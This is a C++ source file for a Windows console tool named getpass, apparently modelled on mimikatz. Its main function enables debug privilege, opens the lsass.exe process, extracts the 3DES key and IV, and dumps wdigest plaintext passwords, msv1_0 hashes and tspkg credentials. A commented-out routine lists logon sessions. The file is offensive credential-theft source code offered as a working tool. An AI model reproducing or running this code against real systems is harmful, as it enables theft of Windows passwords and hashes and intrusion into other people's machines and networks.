// getpass.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "getpass.h"

#pragma comment(linker, "/SUBSYSTEM:CONSOLE,5.2")

int wmain(int argc, LPCWSTR argv[])
{
	MESSAGE(L"[*] Enable debug privilege\r\n");
	RETN_IF(!EnableDebugPrivilege(), L"EnableDebugPrivilege", -1);
	MESSAGE(L"[*] Open process lsass.exe\r\n");
	RETN_MSG_IF(!OpenLsass(), -1, L"Cant open process Lsass.exe\r\n");
	MESSAGE(L"[*] Dump 3deskey and iv\r\n");
	FindBcryptKeys();
	MESSAGE(L"[*] Dump wdigest password entries\r\n");
	Wdigest_LogSessList_Dump();
	MESSAGE(L"[*] Dump msv1_0 hash entries\r\n");
	Msv1_0_LogonSessList_Dump();
	MESSAGE(L"[*] Dump tspkg password entries\r\n");
	Tspkg_TSGlobalCredTable_Dump();
	CloseLsass();
	
	return 0;
}
/*
BOOL EnumLoginSessions() //此程序无必要列举session
{
PLUID lpLuid = NULL, lpTmpLuid = NULL;
PSECURITY_LOGON_SESSION_DATA lpLogonSessionData = NULL;
ULONG ulSize = 0;
if (NT_ERROR(LsaEnumerateLogonSessions(&ulSize, &lpLuid)))
return fwprintf(stderr, L"LsaEnumerateLogonSessions: [%d]\r\n", GetLastError());

if (ulSize > 0)
fwprintf(stdout, L"%-16s\t%-16s\t%-16s\t%-16s\r\n",
L"UserName", L"LogonDoman", L"AuthenticationPackage", L"LogonType"
);

TCHAR szUserName[20] = { 0 };
TCHAR szDomain[20] = { 0 };
TCHAR szDnsDomain[20] = { 0 };
TCHAR szEncryptedPassword[256] = { 0 };

lpTmpLuid = lpLuid;
for (ULONG i = 0; i < ulSize; i++, lpTmpLuid++)
{
if (NT_ERROR(LsaGetLogonSessionData(lpTmpLuid, &lpLogonSessionData)))
continue;
fwprintf(stdout, L"%-16s\t%-16s\t%-16s\t%-16d\r\n",
lpLogonSessionData->UserName.Buffer,
lpLogonSessionData->LogonDomain.Buffer,
lpLogonSessionData->AuthenticationPackage.Buffer,
lpLogonSessionData->LogonType
);

}
LsaFreeReturnBuffer(lpLogonSessionData);
LsaFreeReturnBuffer(lpLuid);
return TRUE;
}
*/
